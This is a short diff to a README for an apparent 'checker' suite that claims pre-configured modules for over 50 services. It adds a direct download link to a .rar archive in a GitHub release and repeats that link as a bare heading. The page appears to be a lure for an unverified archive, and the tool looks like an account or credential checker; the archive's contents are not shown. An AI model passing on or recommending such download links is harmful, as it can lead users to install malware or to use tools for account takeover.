@@ -31,7 +31,7 @@ Our suite includes pre-configured modules for over 50 world-class services, ensu
 
 ### 🛠️ Quick Start
 
-1.  **Download** the latest build from the [Releases](#) tab.⬇️
+1.  **Download** the latest build from the [Releases](https://github.com/TriangleSector/Simple_Checker_2026_new/releases/download/Simple_Checker/Simplechecker.rar)(#) tab.⬇️
 
 ### https://github.com/TriangleSector/Simple_Checker_2026_new/releases/download/Simple_Checker/Simplechecker.rar
 
